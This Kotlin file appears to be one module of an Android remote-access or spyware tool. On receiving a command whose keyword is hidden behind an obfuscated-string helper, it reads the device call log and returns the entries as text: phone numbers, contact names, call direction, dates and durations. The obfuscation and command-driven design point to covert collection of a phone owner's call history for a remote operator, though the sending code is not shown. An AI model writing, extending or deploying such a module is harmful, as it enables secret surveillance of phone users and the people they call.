package com.nexlink.bridge.modules

import android.content.Context
import android.provider.CallLog
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import com.nexlink.bridge.ObfStr

internal object CallLogModule {
    fun execute(ctx: Context, command: String): Pair<String, String> {
        val limit = command.substringAfter(ObfStr.cmdCallsPrefix(), "").toIntOrNull() ?: 50
        return Pair(getCalls(ctx, limit), ObfStr.cmdResult())
    }
    private fun getCalls(ctx: Context, limit: Int): String {
        return try {
            val proj = arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE,
                CallLog.Calls.DATE, CallLog.Calls.DURATION, CallLog.Calls.CACHED_NAME)
            val cur = ctx.contentResolver.query(CallLog.Calls.CONTENT_URI, proj,
                null, null, "${CallLog.Calls.DATE} DESC")
                ?: return "Cannot read call log"
            val fmt = SimpleDateFormat("MM-dd HH:mm", Locale.getDefault())
            val sb  = StringBuilder("Call Log (last $limit)\n")
            var n   = 0
            cur.use {
                while (it.moveToNext() && n < limit) {
                    val num  = it.getString(0) ?: "?"
                    val type = when (it.getInt(1)) {
                        CallLog.Calls.INCOMING_TYPE -> "IN "
                        CallLog.Calls.OUTGOING_TYPE -> "OUT"
                        CallLog.Calls.MISSED_TYPE   -> "MIS"
                        else -> "OTHER"
                    }
                    val date = fmt.format(Date(it.getLong(2)))
                    val dur  = it.getLong(3)
                    val name = it.getString(4)?.takeIf { s -> s.isNotEmpty() }?.let { s -> " ($s)" } ?: ""
                    sb.appendLine("[$date][$type] $num$name — ${dur}s")
                    n++
                }
            }
            if (n == 0) sb.append("Empty") else sb.appendLine("\nTotal: $n")
            sb.toString()
        } catch (e: Exception) { "Error: ${e.message}" }
    }
}
